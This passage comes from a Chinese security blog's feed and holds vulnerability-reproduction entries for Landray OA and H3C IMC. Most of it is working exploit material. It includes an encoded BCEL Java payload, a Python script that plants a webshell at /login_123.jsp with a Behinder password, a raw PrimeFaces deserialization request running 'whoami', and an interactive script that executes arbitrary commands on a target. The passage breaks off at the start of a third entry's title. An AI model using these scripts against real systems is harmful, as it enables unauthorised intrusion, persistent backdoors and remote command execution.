class="line">var&#x3D;&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;&#x2F;sys&#x2F;search&#x2F;sys_search_main&#x2F;sysSearchMain.do?method&#x3D;editParam&quot;&#125;&#125;&amp;fdParemNames&#x3D;11&amp;fdParameters&#x3D;&lt;java&gt;&lt;void+class%3d&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&gt;&lt;void+method%3d&quot;loadClass&quot;&gt;&lt;string&gt;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85U$dbV$dbF$U$dd$83md$Lq3$98K$92$92$sm$gC$ASB$93$U$I46$s$5c$M$n$dc$j$daRY$I$7b$40H$aa$qS$d2$f6$7f$fa$9c$X$d1U$d6$ea$H$f4$87$fa$d6$d5327$bbjk$_$cf$e5$9c$3d$7b$ce$d9gf$fc$c7_$bf$fd$O$e0$v$7e$96q$lS$S$a6e4aJ$c6K$cc$88f6$8e$afd$bcBVF$Os2$f2$98$97$f1$g$L2$W$b1$qaYBAF$x$a6$e2X$91$d1$87U1y$T$c7$9a$e8$df$caP$b0$k$c7$86$84M$Z$3d$82$7dK$f4$dbq$ec$I$f0$ae$f0$XE$f3N$c2$9e$84$af$Z$9a$a7$b9$c9$bd$Z$86Hzp$9b$n$9a$b3$Ot$86$f6$C7$f5$d5$eaIIw6$d5$92A$96d$c1$d2Tc$5bu$b8$98_$g$a3$5e$85$bb$c27$af$ba$de$92k$99y$adbes$f9$c2$U$83$9c$3f$d3t$db$e3$96I$88$e8$89$caM$86$9e$f4$5e$e1H$3dU3$86j$963$h$9e$c3$cd$f2T$b0$ad$ea$94$J$d6$V$e2f$88Ok$c6U$90$9aA$b0$ce$5b$a8$9c$a1$ba$$$81$a2$b6$eaUD$u$n$E$8aM$Do$c7$e1$9e$ee$8c3$a4j$Yne$d6n$ec$E$8b$b9$V$dd0$Y$a4$D$5d$p$V$i$86$be$82$5b53$t$dc$d52$d9W$h$f9g$Ts5$8f$e0$ac$81j$7b0$b4nx$aav$bc$a2$da$812$q$$$J$b0aU$jM$9f$e7B$a9T$a3B$a3$o$G$F$l$e3$BCG$a3S$c27$K$be$c5$be$82$ef$a0R5Jnet$d1$a4$umG$a7VBI$81$86$D$J$ba$82C$94$rT$Up$iI8V$60$e0D$82$a9$c0$82M$82$86d$ca$d0$db$a8Q$b6$ca$8d$mai$t$9f$jY$5c$9dW$f0$3d$i$F$$$3c$866$c3$wss$df$e0$ae7z$e4$da$K$aa$b0E$e0$a7$M$e9$b5$dc$f6$e9$c1$ee$db$aa$b6$b0d$97$ccu$b7$c4$cb$5c$h$af$Y$a5$d7gc$efvW$c7$W$f9$f1$f3$a5$cd$89$97T$fap$r$v$f9$c6$60$U$fc$803$aa$c6$d6$e6$fc$c8$L$b1$d1$7b$F$3f$e2T$c1OB$ab$ae$h$f8$f5$B$ab$pyS$3a$d25$af$ce$b4Yqt$f5$80$8a$a4U$jG7$bd$abywz$b0$d0$88$a2$d2$a6$ca$ba$97$b3H$ee3$_8$5d$FK$N$o$ed$af$83$dfr$895$a1$O$86$84A$83$c0$c2$f0$u$jr$f8C$8er$7b$83$89$92$a6$88$d6$i$cb$a3$c4$u$dd9$abv$9b$k$5e$c5$e3$ea$94$Y$f7$deg$g1D6$f0$df$I$S$r$c8$96NrpZ$Z$ee$fd$83$f5$c6K$7c$7d$ff$e6ch$n$s$f1J$5c$96$e4$8a$c7$d4$bd$cc$d6$bax$S$94$dbs$3al$o$ab$e0$d6$d6$X$e2$fa$de$c6$5c$db$e0T$ca$c7a$c2$85$3e$V$cd$aam$eb$s$95v$e4$7f$b4$ae$3b$f7$e2$8d$f1$ac$ab$ab$9c$K$5b$ba$7d$7d$e3$b3$d5$c3CQ$d9$9e$d0$a0$b2t$bb$d2$7b$d9p$G$vx$87$M$S$t$a6$Z$96$ab$e3$B$bd$fc$f7$n$3e$R0$f1$W$d0$fca$f0$e7$c0$e8$L$c4$86$ce$c1$3e$d0$a0$J$9fP$x$fe$u$c8$88$u$9a$f1$v$8d$94$g$I$8f$f0$Z$f5$8f$e9$X$r$cb$A$SHc$f0$92$ea9$f5$C$95$b8$40S$f1$i$91$9dF$ba$E$e24$ba$a1K$60$IO$ea$e8$e2$Y$a6$c8$98$a0c$R$da$ae$99$3c$95_$R$f5$RK6$fb$90$96$87$7c$c4$7d$q$7c$c8$3eZ$K$XP$8a$Xh$a5$cd$da$9e$q$db$7dtD$c6$7dt$s$93$d4$f8$e8$3aG$f7J2$b5z$81$k$C$f4NF$_$d0W$ec$8f$8e$f8$e8O$de9$c7$dd$c9$d8p$7f$cc$c7$bda$l$l$fd$82$e8$f2$87$m$s$8d$5e$b9$B$d2HD$3d$8a$Wj$db$u$dav$dcA$H$a6$d1$89Y$q$b1$80$$$U$d1$8d$7d$a4$I$dfK$xzPF$7f$90$d9$M$c5$ac$60$H$p$b4$g$b4j$R$Z$8c$R$f34e$f99$c6I$87Y$c2$3d$r$5b$84x$eeb$C_P$eeE$d2$e5$Z$d9b$q$a2$d0$a5$e9O$iJxA$w$e0$cb$40$c4$c9$bf$B$92$e6un$cc$H$A$A&lt;&#x2F;string&gt;&lt;void+method%3d&quot;newInstance&quot;&gt;&lt;&#x2F;void&gt;&lt;&#x2F;void&gt;&lt;&#x2F;void&gt;&lt;&#x2F;java&gt;</span><br></pre></td></tr></table></figure><p>发送数据包<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%93%9D%E5%87%8Cxml2.webp" alt="image"></p><p>验证结果<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%93%9D%E5%87%8Cxml1.webp" alt="image"></p><h4 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/ll11.webp" alt="image"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetShell</span>(<span class="params">urllist</span>):</span></span><br><span class="line">    url = urllist+<span class="string">&quot;/sys/ui/extend/varkind/custom.jsp&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-cn&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;null&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;var&quot;</span>: <span class="string">&quot;&#123;\&quot;body\&quot;:&#123;\&quot;file\&quot;:\&quot;/sys/search/sys_search_main/sysSearchMain.do?method=editParam\&quot;&#125;&#125;&quot;</span>, <span class="string">&quot;fdParemNames&quot;</span>: <span class="string">&quot;11&quot;</span>, <span class="string">&quot;fdParameters&quot;</span>: <span class="string">&quot;&lt;java&gt;&lt;void class=\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&gt;&lt;void method=\&quot;loadClass\&quot;&gt;&lt;string&gt;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85V$dbv$db$d6$R$dd$b0HS$a2$e1$d8$96$z$d9JR$e7$d6$q$b2cY$bc$84$b1e$vvMJ$84$40$C$94x$c5$c5m$5d$Q$84H$88$m$80$Q$80H$aa$fd$9f$3e$e7$85$ee$aa$d6$ea$H$f4$87$fa$96$95$Bh$d9$96$ca6$d2$e2$c19s$f6$d9gf$P1$c3$7f$ff$f2$cf$7f$B$c8$e2oI$7c$86$ed$Ev$92$b8$82$ed$q$7e$c4$f3px$b1$88$3f$q$f1$S$f9$q$K$d8Mb$P$c5$q8$ec$t$c1$a3$94$409$B$n$89$eb$d8$5e$84$98$c4$3dT$c2$c5$c1$o$O$c3g5$J$W$b5E$d4$Th$q$b1$g$b27$c3gk$RR$I$96$c3$7d$r$i$d4$E$5e$r$f0G$GWwL$db$f4$9f3XX$7f$d0b$Q$x8$j$83$c1$N$c1$b4$8dJ0h$h$c3$86$d6$b6$c8$b2$y8$baf$b5$b4$a1$Z$ae$df$gc$7e$cf$f4$c2$bd$a2$e6$f9$r$cf$b1$f7$f4$9e$93$_$ec$J$db$M$92$7bc$ddp$7d$d3$b1$J$R$hh$a6$cd$60u$fd$95p$ac$9dh$9b$96fw7$eb$fe$d0$b4$bb$db$d1$b5$da$b0K$b0$dbs$b6$Z$y$ee$e8$d6$b9$93$baE$b0$5b$l$a0$K$96$e6y$E$8a$b9$9a$df$L$5d$99C$c0$ba4$f1$a5$a1$e9$h$c3$M$83$95$Z$c6t6$P$df$db$J$W$f7z$86e1Ht$M$9dT$Y2$b8$tx$81$bd90$3d$7d3$ff$b2$be$f7$c3$f7$bb$b3$9d$90s$G$9a$dd$c1$e0z$dd$d7$f4$be$a8$b9$912$q$$$JPw$82$a1n$U$cdP$a9$95$cb$K$3d$O$7d$60$f19$be$60p$f3$f2f$C$7fb$f1g$bcf$f1$Xh$94$8d$b6$d7$7b$cc$db$e4$a5$3b4hL$a0$cdBG$t$B$83$c5$R$ba$J$f4X$988N$a0$cf$c2$c2$m$B$9b$85$D$97$E$9d$T$v$83$bb$975$ca$H$a6$V$F$9c$90$f6$f2$h$7c$a5$c8$e2$t$MYx$f0$v4$cb$e9$9a$f6$ebt$s$fb$f8$d8sY$EpC$bfO$98$F$YR$f3i$a9$99$l$vR$c7$e29$cb$d7$b9$adIg7ej$83bF$a9$e7$d2$j$ce$f2$E$d3$f1$a2$b5$dc$N$94l$v$a7$ef$d7N$e6$da$ec$caH$95$c4$a0l$f2$d6$e1$f1$c8$e2$a5$8a$a7$c8$95S$be$d8$ec$aar$_$a5J$b9$be$3e$c9$ef$b6$b9$e2$a9$9e$g$9f$uR$cd$d2m$bfU$de$9b$e1$g$dcVO$e5Z$T$9e$T$5d$p$5bI$eb4$_$d3$fc$m$9b$ku$a4$92$a7Ib$b7$9a$Z$f7$f4$ac$d8U$t$3d$d3$90k$W_$f4$3b$8ai$3d$d1$H$adTG$$$F$fc$fe$ec$9c0$a8Y$ea$c0$K$d4$e6$8c$bb$cc$f1$9eX$Y$9b$c2$60l$b5$H$9d$94V$e8$3f9$92S$91$9f$9a$a4t$cb$fb$rK$97$5b$96$9e$ad$Gj$a6$95jH$ad$94$c6m$f5$cb$85$7e$a0$ca$c5$b4$o$8dO$cb$85R$b5$91$ae4y$b3$ef$g$e9JJ$P$f9$t$f9$e1a$bd$d4$ab$i$ef$8d$w$928R$g$caX$94$f8$U$7dF$fc$b1wR$Od$cem$M$NWW$f2$e2i$a9$d2$96$aa$e9C$beV$R$hje$b7b$f6$b3$3f$c9$dcK$b9d$v$83V$ae$9d$c9$f5$cb$e6$d6$a9J$fej$d2V$m$d8$f9t$a7$a8$f6$da$fb$z$8b$eeN$f3$e6xXn$f8$bb$9a$9cwT$99$ef$w$a7$e9$f3y$e4s$5d$ca$9dv$b8b$a0d$9a$O$df$_$W$9b$T$de$3d$c8$88$81$s$e5$dcN$a1$3b$R$b8$9c$d5$99$e4$h$aaT$99$a8rMPe$abAZ$j$979$_$3a_$b5$ad$94$w$8bN$b9$3e2$ab$cdV$p$8c$f3$m$T$9di$95$f7k$8e$s$8b3$dc$y$H$84$cb$d9$c4s1$9ff$d7$N$ed$94$b7$40$e5$b68$ba$bb$d7$$$f4HC$bd$abg$5b$810H$bb$3a$f9T$ed$X$h$b5$86$92$aa$d1$fd$ed$cc$ec$5c$983$r$b3$d5W$9b$a5$b4$3aP$c9$d6$9b$84$da$93$k$va$d0$b1$3aE$d2$e9$ed$j$82$j$cdE$e2$tm$fatg$3fh$PZ$d9$P5$m$3f$c2$9c$92$7e$a2$a3sE$9b$be$L$tm$bbf$Z$fbU$faNQ$eem$f1G$aah$f3$L$E$bd$d3$97$df1$W$p$8c$a9$c84$h$c5$8d$a7$e1$L4aq$8a$T$W$7f$NK$c0$ed$f7$f0wu$f3$C$c9A$fb$d8$d0$fd$L$a6Fohh$jzA$f5$6084l$ff$7c$7dg$fd$81p$ZE$Vk$a5k$f8$F$87$aa$c8$d8$8f$8a$a6$e0h$91$a7k$X$e0$ll$85g$e6n0X$b2h$SY$Y$7c$bd$3e$a7$a6$cf$a9$d07$$$99$uh$f2$e8p$e8$f8$U$Y$85$bb$eb$cc$9a$c4$97$e7$fex$G$Ff$fa$93$cd$cb$Y$o$bb$ff$ff$R$qJ$U$z$V$e8$a8$I3$f8$f4$bfX$df$ef$S$df$bd$ff$b5$c7$e0$g1$85$cd$efmJ$ceyl$c3$dfl$d6$c2N$c7$7e$b8$a6$g$gF$V5$a3$8b$89x$d7$8e$e2$9ek$99$94$cao$e7$J7$b7$D$5e$d5$5c$d7$b0$v$b5$h$bf$a1$f5$85r$k$b6N$df9$efP$x$f3$8e$b6$de5$b2$7cpt$Ufvu$aeSyj$g$eb$af$f2$f3$Z$SQ$7b$b5H$9c$b8n9$9e$81$_$e8$H$cdg$I$ff$W$c0$84$z$8e$d6_F$bfy$Y$fa$H$e2$P$df$80$f9$99$sW$f0$V$8d$e1$ef$l2$o$86$ab$f8$3d$cd$d8$Z$I_$e3$hz$7eK$9f$YY$eec$J$ebx$f0$96$ea$J$3dC$d4$d2$Z$ae$uo$b0$m$5d$a6$5b$c2$o$cd$de$d3$z$e1$n$be$bb$40$b7$88G$e4$Z$T$d2Q$x$8b$d3$e5$40$ef$l$88M$R_$be$3aE$a2$fcp$8a$c5$v$96$a6HNqM8$D$ab$9c$e1$3a$5d$f6$d1w$cb7$a6$b8$b9$90$99$e2$d6$f22$NS$dc$7e$83$3b$e2$f2J$e5$M$ab$E$b8$fb$yv$86$7b$caZlc$8a$b5$e5$8f$df$e0$93g$f1Gk$f1$v$3e$7d4$c5$ef$fe$8eX$f9$e7$c8$t$9d$9a$f7$7d$d2$u$f4$fa1$ae$d1$f8$Ry$7b$D$l$e3$svp$L$_$b0$8c$7d$dc$86$82$3bx$8d$V$c2$df$a5$T$ab$e8b$z$8a$ec9$f9$ccB$c2$G$9d$G$9d$e2$b1$89$U1$efP$94idH$87$X$84$cb$92m$81x$3e$c1$f7$c8Q$ec$K$e9$f2$D$d9$e2$qb$a8$cb$95$ff$e0$u$81$a7$a4$C$b6$o$R$9f$fd$KP$d5$f3$3c$a3$K$A$A&lt;/string&gt;&lt;void method=\&quot;newInstance\&quot;&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/java&gt;\r\n&quot;</span>&#125;</span><br><span class="line">    requests.post(url, headers=headers, data=data)</span><br><span class="line">    listshell = urllist+<span class="string">&quot;/login_123.jsp&quot;</span></span><br><span class="line">    listshellr = requests.get(url=listshell)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> listshellr.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">in</span> listshellr.text:</span><br><span class="line">        print(<span class="string">&quot;成功GetShellshell地址为：&quot;</span>+urllist+<span class="string">&quot;/login_123.jsp   ----&gt;冰蝎3密码为：yse&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;webshell不存在利用失败--请手动验证&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv) == <span class="number">2</span>):</span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        GetShell(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;python3 lgo.py http://xx.xx.xx.xx&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 蓝凌 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>H3C IMC 命令执行</title>
      <link href="2021/06/05/H3C-IMC-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>2021/06/05/H3C-IMC-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="自行搭建测试环境"><a href="#自行搭建测试环境" class="headerlink" title="自行搭建测试环境"></a>自行搭建测试环境</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/HEC1.webp" alt="image"></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="漏洞路径"><a href="#漏洞路径" class="headerlink" title="漏洞路径"></a>漏洞路径</h5><pre><code>/imc/javax.faces.resource/dynamiccontent.properties.xhtml</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/HEC2.webp" alt="image"></p><h5 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;imc&#x2F;javax.faces.resource&#x2F;dynamiccontent.properties.xhtml HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.88:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 1567</span><br><span class="line"></span><br><span class="line">pfdrt&#x3D;sc&amp;ln&#x3D;primefaces&amp;pfdrid&#x3D;uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&amp;cmd&#x3D;whoami</span><br></pre></td></tr></table></figure><h4 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/HEC3.webp" alt="image"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">proxy = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span>, <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">urllist,cmdsr</span>):</span></span><br><span class="line">    url = urllist+<span class="string">&#x27;/imc/javax.faces.resource/dynamiccontent.properties.xhtml&#x27;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;pfdrt&quot;</span>: <span class="string">&quot;sc&quot;</span>, <span class="string">&quot;ln&quot;</span>: <span class="string">&quot;primefaces&quot;</span>, <span class="string">&quot;pfdrid&quot;</span>: <span class="string">&quot;uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV/KAe9gtw54DSQCl72JjEAsHTRvxAuJC+/IFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf/cNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv+Eo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c+GvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy+ZLezLj6vK+pVFyKR7s8xN5Ol1tz/G0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM/cwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16/I7eog15OBl4Kco/VjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH+N7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO+Eb/60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF/ciVuZGssKeVT/gR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx/qFUj+DikXHLvbUMrMlNAqSFJpqoy/QywVdBmlVdx+vJelZEK+BwNF9J4p/1fQ8wJZL2LB9SnqxAKr5kdCs0H/vouGHAXJZ+Jzx5gcCw5h6/p3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D/ukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd+LylDFB3dcYIgZtZoaSMAV3pyNoOzHy+1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3+9h0aurkyJVR28jIQlF4nT0nZqpixP/nc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl+zoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH+OwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE+lsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU=&quot;</span>, <span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;%s&quot;</span> % cmdsr&#125;</span><br><span class="line">    cmdlist = requests.post(url=url,data=data,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">    cmdshowlist =  cmdlist.text</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cmdshowlist) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">&#x27;未读取到执行结果请检查命令是否正确，或不存在漏洞&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;------------------------------执行结果----------------------------------\n&#x27;</span>)</span><br><span class="line">    print(cmdlist.text)</span><br><span class="line">    print(<span class="string">&#x27;------------------------------------------------------------------------\n&#x27;</span>)</span><br><span class="line">    jhlist = <span class="built_in">input</span>(<span class="string">&#x27;输入下条需要执行的命令--退出输入T：&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> jhlist == <span class="string">&#x27;T&#x27;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd(urllist,jhlist)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;------------------------------------------------------------------------\n&#x27;</span>)</span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&#x27;请输入url-格式为:https://xx.xx.xx.xx   ==&gt;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;------------------------------------------------------------------------\n&#x27;</span>)</span><br><span class="line">    cmdsr = <span class="built_in">input</span>(<span class="string">&#x27;输入需要执行的命令: ==&gt;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;---------------------------------------------------------\n&#x27;</span>)</span><br><span class="line">    cmd(url,cmdsr)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>test</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> rce </tag>
            
            <tag> H3C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用友NC BshServlet 命令执行</title>
